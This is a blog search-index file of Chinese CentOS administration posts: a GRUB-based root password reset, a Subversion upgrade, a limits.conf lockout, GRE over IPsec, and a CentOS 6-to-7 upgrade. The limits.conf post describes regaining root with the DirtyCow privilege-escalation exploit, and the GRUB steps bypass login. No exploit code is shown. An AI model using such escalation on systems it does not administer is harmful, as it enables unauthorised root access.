<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CentOS 7 下重置 root 密码的步骤</title>
    <url>/2017/12/CentOS%207%20%E4%B8%8B%E9%87%8D%E7%BD%AE%20root%20%E5%AF%86%E7%A0%81%E7%9A%84%E6%AD%A5%E9%AA%A4/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>起因自然是我厂某台 CentOS 7.x 的机器需要重置密码，然后我就想按老套路：重启进单用户，再重设密码。没想到 CentOS 7.x 的系统跟 CentOS 6.x 来说有了很大的变化，于是我又只好翻了下文档，重新学习了一下。以下是具体操作步骤：</p>
<a id="more"></a>
<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="重启服务器"><a href="#重启服务器" class="headerlink" title="重启服务器"></a>重启服务器</h2><p>对于有远程控制卡的或者各种云上的服务器，自然可以模拟按 Ctrl+Alt+Del 或模拟按电源重启</p>
<h2 id="进入-GRUB-编辑界面"><a href="#进入-GRUB-编辑界面" class="headerlink" title="进入 GRUB 编辑界面"></a>进入 GRUB 编辑界面</h2><p>当系统进入 GRUB 的时候，马上敲入字母键 “e”。</p>
<h2 id="编辑-GRUB-启动选项"><a href="#编辑-GRUB-启动选项" class="headerlink" title="编辑 GRUB 启动选项"></a>编辑 GRUB 启动选项</h2><p>找到 “linux16” 开头的那一行，将 “ ro “ 改成 “ rw init=/sysroot/bin/sh “</p>
<h2 id="继续用改后的参数启动"><a href="#继续用改后的参数启动" class="headerlink" title="继续用改后的参数启动"></a>继续用改后的参数启动</h2><p>按 Ctrl+x 继续启动</p>
<h2 id="单用户模式改密码"><a href="#单用户模式改密码" class="headerlink" title="单用户模式改密码"></a>单用户模式改密码</h2><ul>
<li>chroot /sysroot</li>
<li>passwd</li>
<li>touch /.autorelabel</li>
<li>reboot -f</li>
</ul>
<p>注意：以上第三步很重要，不做的话由于 SElinux 的关系，虽然改了密码会依然无法登录的。</p>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>7.x</tag>
        <tag>GRUB</tag>
        <tag>root</tag>
        <tag>recovery</tag>
        <tag>autorelabel</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.5上升级svn到1.9.5</title>
    <url>/2016/12/CentOS6-5%E4%B8%8A%E5%8D%87%E7%BA%A7svn%E5%88%B01-9-5/index.html</url>
    <content><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>环境是一台开发用（pc）服务器，具体情况如下：</p>
<ul>
<li>CentOS 6.5</li>
<li>Subversion（svn） 1.6.11</li>
<li>Kernel 2.6.32-431.17.1.el6.x86_64</li>
</ul>
<h1 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h1><p>为什么要升级 svn？</p>
<a id="more"></a>
<p>因为开发同学有报 <code>svn up</code> 时巨慢。通过 strace 简单跟了一下，发现是系统调用 open 被调用了大几万次，耗费了 99% 的时间。google 了一下，有说是：</p>
<blockquote>
<p>The Subversion working copy performs quite badly when there’s a huge number of directories, like in your case. For write operations (even only locally) to the working copy, the working copy has to be locked, which means that a lock file is created in every directory (that’s 11k file creates), then the action executes, and the those 11k files are deleted again.</p>
<p>Subversion 1.7 is moving to a different working copy format, that should resolve these problems. Until then there’s a few tricks you might try to speed things up, like excluding the working copy from your virus scanner, disabling file monitors on the directory (like TortoiseSvnCache), and trying to reduce the total number of directories. (Perhaps by checking out a few separate working copies)</p>
</blockquote>
<p>这段话描述的情况跟我面对的情况何其相似！报慢的开发同学那个 <code>svn up</code> 的目录也巨大无比、目录文件众多。</p>
<p>然后在我的建议下，开发同学用他本地的 Subversion(1.8.8) 做了下对比测试，同样用 strace 跟，发现系统调用 open 减至一千多次，所占时间可忽略不计。</p>
<p>结论：升级 subversion 版本的办法看来是靠谱的。</p>
<h1 id="How-to"><a href="#How-to" class="headerlink" title="How to"></a>How to</h1><h2 id="RPM-方式"><a href="#RPM-方式" class="headerlink" title="RPM 方式"></a>RPM 方式</h2><p>这是我最初比较倾向于的方案，这种方式的复杂度在于：</p>
<ol>
<li>CentOS 6.x 的官方 yum 源和 epel 里的 subversion 的最高版本只到 1.6.x</li>
<li>Subversion 的源代码里并没有提供可用的 .spec 文件</li>
<li>Subversion 官网上列出的 CentOS 的 RPM 包维护的几家里两家需要注册帐号，剩下那家已经挂掉很久了。 </li>
</ol>
<p>这一切的一切看起来都表明着我只能自己手写 .spec 文件来自己 build Subversion 的 RPM 包了。</p>
<p>但是机智如我，又怎么能就此屈服而去做这种及其繁琐复杂且效果未知的事情呢？果然，很轻松在 google 里找到了上面需要注册帐号的两家中的一家的 yum 源的路径（<a href="http://opensource.wandisco.com/centos/6/svn-1.9/RPMS/x86_64/）。有了这个，升级就不要太简单哟" target="_blank" rel="noopener">http://opensource.wandisco.com/centos/6/svn-1.9/RPMS/x86_64/）。有了这个，升级就不要太简单哟</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">BASE_URL=<span class="string">"http://opensource.wandisco.com/centos/6/svn-1.9/RPMS/x86_64"</span>;</span><br><span class="line">rpm -Uvh \</span><br><span class="line">	<span class="variable">$&#123;BASE_URL&#125;</span>/subversion-1.9.5-1.x86_64.rpm \</span><br><span class="line">	<span class="variable">$&#123;BASE_URL&#125;</span>/subversion-perl-1.9.5-1.x86_64.rpm \</span><br><span class="line">	<span class="variable">$&#123;BASE_URL&#125;</span>/serf-1.3.7-1.x86_64.rpm;</span><br></pre></td></tr></table></figure>
<h2 id="源代码编译"><a href="#源代码编译" class="headerlink" title="源代码编译"></a>源代码编译</h2><p>这种方式是必须要做的，因为需要先“装”一个高版本的 Subversion 先试一下。具体步骤如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install unzip wget make gcc;</span><br><span class="line">BASE_URL=<span class="string">"http://opensource.wandisco.com/centos/6/svn-1.9/RPMS/x86_64"</span>;</span><br><span class="line">rpm -ivh \</span><br><span class="line">	<span class="variable">$&#123;BASE_URL&#125;</span>/serf-devel-1.3.7-1.x86_64.rpm;</span><br><span class="line"><span class="comment"># serf-devel 是源代码编译 Subversion&gt;1.7 以上版本时必需</span></span><br><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/src;</span><br><span class="line">wget \</span><br><span class="line">	http://www-eu.apache.org/dist/subversion/subversion-1.9.5.tar.gz;</span><br><span class="line">wget \</span><br><span class="line">	http://www.sqlite.org/sqlite-amalgamation-3071501.zip;</span><br><span class="line">tar xzvf subversion-1.9.5.tar.gz;</span><br><span class="line">unzip sqlite-amalgamation-3071501.zip -d .</span><br><span class="line"><span class="built_in">cd</span> subversion-1.9.5;</span><br><span class="line">ln -s \</span><br><span class="line">	../sqlite-amalgamation-3071501 \</span><br><span class="line">	sqlite-amalgamation;</span><br><span class="line">./configure --prefix=/usr/<span class="built_in">local</span>/subversion;</span><br><span class="line">make;</span><br><span class="line">make install;</span><br></pre></td></tr></table></figure>
<h1 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h1><ul>
<li><a href="http://subversion.apache.org/" target="_blank" rel="noopener">Subversion 官网</a></li>
</ul>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>Subversion</tag>
        <tag>svn</tag>
        <tag>update</tag>
        <tag>strace</tag>
        <tag>open</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.x 下 /etc/security/limits.conf 被改错的故障经历</title>
    <url>/2016/12/CentOS6-x%E4%B8%8Blimits-conf%E8%A2%AB%E6%94%B9%E9%94%99%E7%9A%84%E6%95%85%E9%9A%9C%E7%BB%8F%E5%8E%86/index.html</url>
    <content><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>我司本小厂，每个员工都是身兼数职，所以开发人员直接登录线上服务器改东西是常态。有些开发人员，自持水平较高（的确水平也是较高，但缺乏对系统的敬畏），所以总是越俎代庖，改一些本身应该是线上运维人员改动的配置。本文提到的 <strong>&#x2F;etc&#x2F;security&#x2F;limits.conf</strong> 两次改错导致的事故，皆是因为于此。</p>
<span id="more"></span>

<h1 id="In-details"><a href="#In-details" class="headerlink" title="In details"></a>In details</h1><h2 id="The-first-time"><a href="#The-first-time" class="headerlink" title="The first time"></a>The first time</h2><p>第一次是在 &#x2F;etc&#x2F;security&#x2F;limits.conf 中加了两句：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">*	soft	nofile	unlimited</span><br><span class="line">*	hard	nofile	unlimited</span><br></pre></td></tr></table></figure>

<p>结果就是：<br>所有用户无法登录。一登录，马上被踢出来。</p>
<p>最后解决方法：<br>单用户进系统把文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 改回来。</p>
<p>原因：<br>配置文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 中 nofile 的参数，只支持数字，”unlimited” 显然系统不认。</p>
<h2 id="The-second-time"><a href="#The-second-time" class="headerlink" title="The second time"></a>The second time</h2><p>第二次也是在 &#x2F;etc&#x2F;security&#x2F;limits.conf 中加了两句：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">root	soft	nofile	2000000</span><br><span class="line">root	hard	nofile	2000000</span><br></pre></td></tr></table></figure>
<p>结果是：</p>
<ul>
<li>root 用户一登录，就被踢</li>
<li>普通用户可登录，但 <code>sudo su -</code> 一切成 root 马上会被踢（但普通用户只支持 <code>sudo su -</code>）</li>
</ul>
<p>解决方法：<br>像前面文章 <a href="/2016/11/%E4%B8%80%E6%AC%A1%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%AE%9E%E6%88%98%E6%BC%94%E7%BB%83/">一次本地提权的实战演练</a> 有提到的:</p>
<ol>
<li>普通用户登录</li>
<li>用 DirtyCow（脏牛）本地提权</li>
<li>然后把 &#x2F;etc&#x2F;security&#x2F;limits.conf 改回去。</li>
</ol>
<p>原因：</p>
<ol>
<li>配置文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 中 nofile 的参数，其最大值不能大于 kernel 参数 NR_OPEN 的限制</li>
<li>而 kernel 2.6.32 里，NR_OPEN 的值缺省为 1024*1024&#x3D;1048576</li>
<li>这里的 2000000&gt;1048576，所以出错被踢</li>
</ol>
<p>稍稍延展一下，如果我一定要将 nofile 参数设置为 2000000呢？<br>其实这也有办法，提高 kernel 里 NR_OPEN 的值即可，具体方法是：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[[ ! -e /etc/sysctl.d ]] &amp;&amp; <span class="built_in">mkdir</span> /etc/sysctl.d;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;fs.nr_open = 2000000&quot;</span> &gt; /etc/sysctl.d/nr_open.conf;</span><br><span class="line">sysctl -w fs.nr_open=2000000;</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总而言之，言而总之：Linux 下配置文件 &#x2F;etc&#x2F;security&#x2F;limits.conf 文件不要随意改动。我其实还是倾向于在启动服务的启动脚本里手工用 ulimit 命令来设置相关参数而不要直接在 &#x2F;etc&#x2F;security&#x2F;limits.conf 文件里改。</p>
]]></content>
      <tags>
        <tag>CentOS</tag>
        <tag>ulimit</tag>
        <tag>limits.conf</tag>
        <tag>NR_OPEN</tag>
        <tag>DirtyCow</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.x下用ipsec加密GRE隧道</title>
    <url>/2016/08/CentOS6-x%E4%B8%8B%E7%94%A8ipsec%E5%8A%A0%E5%AF%86GRE%E9%9A%A7%E9%81%93/index.html</url>
    <content><![CDATA[<h1 id="楔子"><a href="#楔子" class="headerlink" title="楔子"></a>楔子</h1><p>前面的文章：<a href="/2016/08/Linux下用GRE隧道直接联通两个私网/" title="Title">Linux下用GRE隧道直接联通两个私网</a>里讲了怎样用在两个独立的私网间打洞(GRE tunnel)来直接连通两个不同的私网，进阶需求就是希望能把这个tunnel加密一下。否则，有心的坏人可能会在外部线路上窃听到很多敏感的信息。因此，本文将要讲的，算是前一文章的进阶部分：<strong>给打洞的隧道加密</strong>！</p>
<h2 id="Why-“GRE-over-IPSec”"><a href="#Why-“GRE-over-IPSec”" class="headerlink" title="Why “GRE over IPSec”"></a>Why “GRE over IPSec”</h2><p>光是说加密隧道的话，方案有好几种：</p>
<ul>
<li>IPSec tunnel</li>
<li>GRE over IPSec</li>
<li>IPSec over GRE</li>
<li>……</li>
</ul>
<p>我们为什么选用<strong>GRE over IPSec</strong>呢？<br>跟单纯的<strong>IPSec tunnel</strong>比，优势在于：</p>
<ul>
<li>方案更灵活，我们可以灵活的把要加密的流量路由到GRE隧道上</li>
<li>而且IPSec不支持多播，像OSPF或其他高大上的路由协议没法玩儿</li>
</ul>
<p>跟<strong>IPSec over GRE</strong>比：</p>
<ul>
<li>更安全。整个上公网的流量都是加密的，但从外部根本都不知道跑的是GRE协议。</li>
</ul>
<p>接下来，我们主要就是要讲的方案是：<strong>GRE over IPSec</strong><br><a id="more"></a></p>
<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><table>
<thead>
<tr>
<th>对象</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr>
<td>NETA</td>
<td>10.0.0.0/24的一个私网，网关是GWA</td>
</tr>
<tr>
<td>NETB</td>
<td>10.0.1.0/24的一个私网，网关是GWB</td>
</tr>
<tr>
<td>NETC</td>
<td>节点都能互通的一个网络，可以认为是公网</td>
</tr>
<tr>
<td>GWA</td>
<td>ip:10.0.0.1(NETA)、1.1.1.1(NETC)，CentOS6.x</td>
</tr>
<tr>
<td>GWB</td>
<td>ip:10.0.1.1(NETB)、2.2.2.2(NETC)，CentOS6.x</td>
</tr>
<tr>
<td>greB</td>
<td>GWA上的虚拟网络接口，GRE隧道名</td>
</tr>
<tr>
<td>greA</td>
<td>GWB上的虚拟网络接口，GRE隧道名</td>
</tr>
<tr>
<td>eth0</td>
<td>GWA连NETA、GWB连NETB的网络设备名</td>
</tr>
<tr>
<td>eth1</td>
<td>GWA和GWB连NETC的网络设备名</td>
</tr>
</tbody>
</table>
<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>分别在GWA和GWB两台机上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install libreswan iptables;</span><br><span class="line">rm -rf /etc/ipsec.d/*db; <span class="comment"># 删除原有自带的db文件</span></span><br><span class="line">ipsec initnss; <span class="comment"># 重新初始化db</span></span><br><span class="line">checonfig ipsec on; <span class="comment"># 这一步也可以后面再做</span></span><br></pre></td></tr></table></figure>
<h2 id="正常打洞"><a href="#正常打洞" class="headerlink" title="正常打洞"></a>正常打洞</h2><p>GWA上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee /etc/sysconfig/network-scripts/ifcfg-greB</span><br><span class="line">DEVICE=greB</span><br><span class="line">ONBOOT=yes</span><br><span class="line">TYPE=GRE</span><br><span class="line">PEER_OUTER_IPADDR=2.2.2.2</span><br><span class="line">PEER_INNER_IPADDR=10.0.1.0/24</span><br><span class="line">MY_OUTER_IPADDR=1.1.1.1</span><br><span class="line">MY_INNER_IPADDR=10.0.0.1</span><br><span class="line">KEY=http://haw-haw.org</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">ifup greB;</span><br></pre></td></tr></table></figure>
<p>同样，在GWB上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt; EOF | tee /etc/sysconfig/network-scripts/ifcfg-greA</span><br><span class="line">DEVICE=greA</span><br><span class="line">ONBOOT=yes</span><br><span class="line">TYPE=GRE</span><br><span class="line">PEER_OUTER_IPADDR=1.1.1.1</span><br><span class="line">PEER_INNER_IPADDR=10.0.0.0/24</span><br><span class="line">MY_OUTER_IPADDR=2.2.2.2</span><br><span class="line">MY_INNER_IPADDR=10.0.1.1</span><br><span class="line">KEY=http://haw-haw.org</span><br><span class="line">BOOTPROTO=none</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">ifup greA;</span><br></pre></td></tr></table></figure>
<p>这样，其实打洞就基本上已经完成了，现在从NETA和NETB的网络里随便找两台机器，都应该能互通了。</p>
<h2 id="GRE-over-IPSEC"><a href="#GRE-over-IPSEC" class="headerlink" title="GRE over IPSEC"></a>GRE over IPSEC</h2><h3 id="配置GWA"><a href="#配置GWA" class="headerlink" title="配置GWA"></a>配置GWA</h3><p>在GWA上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipsec newhostkey \</span><br><span class="line">--configdir /etc/ipsec.d \</span><br><span class="line">--random /dev/urandom \</span><br><span class="line">--output /etc/ipsec.d/GWA.secrets \</span><br><span class="line">--verbose;</span><br><span class="line"><span class="comment"># 上面的"--random /dev/urandom"的参数比用缺省的效率要高很多！</span></span><br><span class="line">ipsec showhostkey --left;</span><br><span class="line"><span class="comment"># 记下输出中“leftrsasigkey=”这一行</span></span><br><span class="line"><span class="comment"># 这将用于本机(GWA)的/etc/ipsec.d/greB.conf文件中</span></span><br><span class="line">ipsec showhostkey --right;</span><br><span class="line"><span class="comment"># 记下输出中“rightrsasigkey=”这一行</span></span><br><span class="line"><span class="comment"># 这将用于对端机器(GWB)的/etc/ipsec.d/greA.conf文件中</span></span><br><span class="line">vim /etc/ipsec.d/greB.conf <span class="comment"># 建立配置文件greB.conf</span></span><br></pre></td></tr></table></figure>
<p>内容如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">conn greB</span><br><span class="line">    type=transport</span><br><span class="line">    left=10.0.0.1</span><br><span class="line">    leftrsasigkey=......</span><br><span class="line">    leftprotoport=gre</span><br><span class="line">    right=10.0.1.1</span><br><span class="line">    rightrsasigkey=......</span><br><span class="line">    rightprotoport=gre</span><br><span class="line">    authby=rsasig</span><br><span class="line">    auto=start</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li>这里的greB是随便取的，只是因为GWA上的隧道设备名为greB，所以就沿用了这个名字</li>
<li>leftrsasigkey=是来自于上面<em>ipsec showhostkey –left</em>命令</li>
<li>rightrsasigkey=是来自于GWB上执行命令<em>ipsec showhostkey –right</em>的结果</li>
</ul>
<h3 id="配置GWB"><a href="#配置GWB" class="headerlink" title="配置GWB"></a>配置GWB</h3><p>依葫芦画瓢，在GWB上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipsec newhostkey \</span><br><span class="line">--configdir /etc/ipsec.d \</span><br><span class="line">--random /dev/urandom \</span><br><span class="line">--output /etc/ipsec.d/GWB.secrets \</span><br><span class="line">--verbose;</span><br><span class="line">ipsec showhostkey --left;</span><br><span class="line"><span class="comment"># 记下输出中“leftrsasigkey=”这一行</span></span><br><span class="line"><span class="comment"># 这将用于本机(GWB)的/etc/ipsec.d/greA.conf文件中</span></span><br><span class="line">ipsec showhostkey --right;</span><br><span class="line"><span class="comment"># 记下输出中“rightrsasigkey=”这一行</span></span><br><span class="line"><span class="comment"># 这将用于对端机器(GWA)的/etc/ipsec.d/greB.conf文件中</span></span><br><span class="line">vim /etc/ipsec.d/greA.conf</span><br><span class="line"><span class="comment"># 建立配置文件greA.conf，因为tunnel设备名叫greA</span></span><br></pre></td></tr></table></figure>
<p>内容如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">conn greA</span><br><span class="line">    type=transport</span><br><span class="line">    left=10.0.1.1</span><br><span class="line">    leftrsasigkey=......</span><br><span class="line">    leftprotoport=gre</span><br><span class="line">    right=10.0.0.1</span><br><span class="line">    rightrsasigkey=......</span><br><span class="line">    rightprotoport=gre</span><br><span class="line">    authby=rsasig</span><br><span class="line">    auto=start</span><br></pre></td></tr></table></figure>
<p>注意：</p>
<ul>
<li>这里的greA是随便取的，只是因为GWB上的隧道设备名为greA，所以就沿用了这个名字</li>
<li>leftrsasigkey=是来自于上面<em>ipsec showhostkey –left</em>命令</li>
<li>rightrsasigkey=是来自于GWA上执行命令<em>ipsec showhostkey –right</em>的结果</li>
</ul>
<h2 id="Iptables"><a href="#Iptables" class="headerlink" title="Iptables"></a>Iptables</h2><p>本来在前面正常GRE打洞测步骤里其实也有iptables相关设置，这里就都整合到这一部分统一说了</p>
<p>在GWA和GWB上分别执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -i eth1 -p gre -j ACCEPT;</span><br><span class="line">iptables -A INPUT -i eth1 -p udp \</span><br><span class="line">    -m state --state NEW \</span><br><span class="line">    -m udp \</span><br><span class="line">    -m multiport --dports 50,51,500,4500 \</span><br><span class="line">    -j ACCEPT;</span><br><span class="line">iptables -A INPUT -i eth1 -p tcp \</span><br><span class="line">    -m state --state NEW \</span><br><span class="line">    -m tcp \</span><br><span class="line">    -m multiport --dports 50,51 \</span><br><span class="line">    -j ACCEPT;</span><br><span class="line">iptables -t mangle -A FORWARD \</span><br><span class="line">    -p tcp -m tcp --tcp-flags SYN,RST SYN \</span><br><span class="line">    -j TCPMSS --clamp-mss-to-pmtu;</span><br><span class="line">/etc/init.d/iptables save; <span class="comment"># 将iptables规则存入配置文件</span></span><br></pre></td></tr></table></figure>
<h2 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h2><p>分别在GWA和GWB的机器上执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/etc/init.d/ipsec start;</span><br><span class="line">ipsec auto --add greB; <span class="comment"># 仅GWA上执行</span></span><br><span class="line">ipsec auto --up greB; <span class="comment"># 仅GWA上执行</span></span><br><span class="line">ipsec auto --add greA; <span class="comment"># 仅GWB上执行</span></span><br><span class="line">ipsec auto --up greA; <span class="comment"># 仅GWB上执行</span></span><br><span class="line">chkconfig ipsec on;</span><br><span class="line"><span class="comment"># 如果前面没有执行这句的这里执行一下，</span></span><br><span class="line"><span class="comment"># 以后ipsec就会随机器启动起起来，</span></span><br><span class="line"><span class="comment"># 而且不再需要ipsec auto --add和ipsec auto --up了</span></span><br></pre></td></tr></table></figure>
<h2 id="简单测试"><a href="#简单测试" class="headerlink" title="简单测试"></a>简单测试</h2><p>要检验是否成功设置，可以分别在GWA和GWB上听包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -nn -i eth1 host 1.1.1.1 and host 2.2.2.2;</span><br></pre></td></tr></table></figure>
<p>会发现包都是ESP加密过的了。</p>
<p>然后分别在GWA和GWB上干掉ipsec对greB和greA的加密干掉</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ipsec auto --delete greB; <span class="comment"># 仅在GWA上执行</span></span><br><span class="line">ipsec auto --delete greA; <span class="comment"># 仅在GWB上执行</span></span><br></pre></td></tr></table></figure>
<p>然后再重复上面的听包命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tcpdump -nn -i eth1 host 1.1.1.1 and host 2.2.2.2;</span><br></pre></td></tr></table></figure>
<p>会发现加密包没有了，取而代之是GRE包，而且明显能看到GRE包里封装的内容。</p>
]]></content>
      <tags>
        <tag>IPSec</tag>
        <tag>GRE</tag>
        <tag>tunnel</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS6.x到CentOS7.x的在线升级</title>
    <url>/2016/10/CentOS6-x%E5%88%B0CentOS7-x%E7%9A%84%E5%9C%A8%E7%BA%BF%E5%8D%87%E7%BA%A7/index.html</url>
    <content><![CDATA[<h1 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h1><p>相比<strong>Debian</strong>系的Linux发布版(如<strong>Debian</strong>、<strong>Ubuntu</strong>)，都能很好地支持在线大版本升级，<strong>RedHat</strong>系的Linux发布版（如<strong>RedHat</strong>、<strong>CentOS</strong>），其大版本升级一直是为人所诟病的问题。</p>
<a id="more"></a>
<p>这种情况到了CentOS7，终于有了改观：RedHat放出了UpgradeTool，同样，CentOS自然也有了。</p>
<p>注意：如果已经是CentOS6.7以后的版本了，在线升级到CentOS7可能会有问题，因为CentOS6.7以后版本有些软件的版本已经比CentOS7还高了，升级可能会出问题。</p>
<h1 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a>具体步骤</h1><h2 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF &gt;/etc/yum.repos.d/upgradetool.repo</span><br><span class="line">[upg]</span><br><span class="line">name=CentOS-<span class="variable">$releasever</span> - Upgrade Tool</span><br><span class="line">baseurl=http://dev.centos.org/centos/6/upg/x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">enabled=1</span><br><span class="line">gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-CentOS-6</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">yum -y install redhat-upgrade-tool \</span><br><span class="line">	 preupgrade-assistant-contents;</span><br></pre></td></tr></table></figure>
<h2 id="升级前可行性分析"><a href="#升级前可行性分析" class="headerlink" title="升级前可行性分析"></a>升级前可行性分析</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">preupg -l; <span class="comment"># 列出预升级的可用内容，多半是"CentOS6_7"</span></span><br><span class="line">preupg -s CentOS6_7; <span class="comment"># 这里的"CentOS6_7"是上个命令的输出</span></span><br><span class="line"><span class="comment"># 上面这个命令生成的报告需要看看，主要是关于升级的风险的</span></span><br><span class="line"><span class="comment"># 个人经验就是升级前尽量将非官方的rpm安装的软件都删掉</span></span><br><span class="line"><span class="comment"># 安装的第三方的rpm包越少，升级的风险越小</span></span><br></pre></td></tr></table></figure>
<h2 id="开始升级"><a href="#开始升级" class="headerlink" title="开始升级"></a>开始升级</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm --import \</span><br><span class="line">	 http://mirror.centos.org/centos/RPM-GPG-KEY-CentOS-7;</span><br><span class="line">centos-upgrade-tool-cli --network 7 \</span><br><span class="line">	 --instrepo=http://mirror.centos.org/centos/7/os/x86_64/;</span><br><span class="line"><span class="comment"># 上面这个命令的--instrepo参数用的是官方的repo，</span></span><br><span class="line"><span class="comment"># 如果自己搭建的有repo镜像（一般都有吧），用自己的就好</span></span><br><span class="line"><span class="comment"># 需要注意的是，这个镜像目录下需要有文件.treeinfo</span></span><br><span class="line"><span class="comment"># 没有的话就去官方的位置拷贝一个下来，记得版本号要一致哟</span></span><br><span class="line">reboot; <span class="comment"># 最后，重启机器即可</span></span><br><span class="line"><span class="comment"># 注意：这次重启到能ssh登录需要的时间可能比较长，</span></span><br><span class="line"><span class="comment"># 因为第一次重启后系统会自动升级，</span></span><br><span class="line"><span class="comment"># 升级完毕以后会再次自动重启，这次起来后才能ssh登录</span></span><br></pre></td></tr></table></figure>
<h2 id="收尾工作"><a href="#收尾工作" class="headerlink" title="收尾工作"></a>收尾工作</h2><p>机器起来后，登上服务器，需要做一些擦屁股的工作，比如，看还有没有CentOS6的软件残余，用命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 首先看能否删掉这些el6的软件包</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(rpm -qa | grep -i el6)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	rpm -e <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 再看还剩哪些el6的软件包</span></span><br><span class="line">rpm -qa | grep -i el6;</span><br><span class="line"><span class="comment"># 再尝试删掉依赖于这些没删掉的el6软件包的软件包</span></span><br><span class="line"><span class="comment"># 再删掉el6的软件包</span></span><br><span class="line"><span class="comment"># 最后，降级剩下的el6的软件包</span></span><br><span class="line"><span class="comment"># 因为最后剩的这些软件包是版本比el7上的新的又不好被删除的</span></span><br><span class="line"><span class="comment"># 所以把最后这部分”降级“到el7的版本即可</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $(rpm -qa | grep -i el6 | cut -d<span class="string">'-'</span> -f1)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	yum downgrade <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<p>有的话要么想办法删掉，要么想办法将其升级到el7的相应的软件包。</p>
<h2 id="可能出的错误"><a href="#可能出的错误" class="headerlink" title="可能出的错误"></a>可能出的错误</h2><p>如果<strong>preupg -s CentOS6_7;</strong>时出了如下的错误：</p>
<blockquote>
<p>I/O warning : failed to load external entity “/usr/share/openscap/xsl/security-guide.xsl”<br>compilation error: file /usr/share/preupgrade/xsl/preup.xsl line 40 element import<br>xsl:import : unable to load /usr/share/openscap/xsl/security-guide.xsl<br>I/O warning : failed to load external entity “/usr/share/openscap/xsl/oval-report.xsl”<br>compilation error: file /usr/share/preupgrade/xsl/preup.xsl line 41 element import<br>xsl:import : unable to load /usr/share/openscap/xsl/oval-report.xsl<br>I/O warning : failed to load external entity “/usr/share/openscap/xsl/sce-report.xsl”<br>compilation error: file /usr/share/preupgrade/xsl/preup.xsl line 42 element import<br>xsl:import : unable to load /usr/share/openscap/xsl/sce-report.xsl<br>OpenSCAP Error:: Could not parse XSLT file ‘/usr/share/preupgrade/xsl/preup.xsl’ [oscapxml.c:416]<br>Unable to open file /root/preupgrade/result.html<br>Usage: preupg [options]</p>
</blockquote>
<blockquote>
<p>preupg: error: [Errno 2] No such file or directory: ‘/root/preupgrade/result.html’</p>
</blockquote>
<p>那么应该是openscap的版本过高，需要降级到upg里的版本。</p>
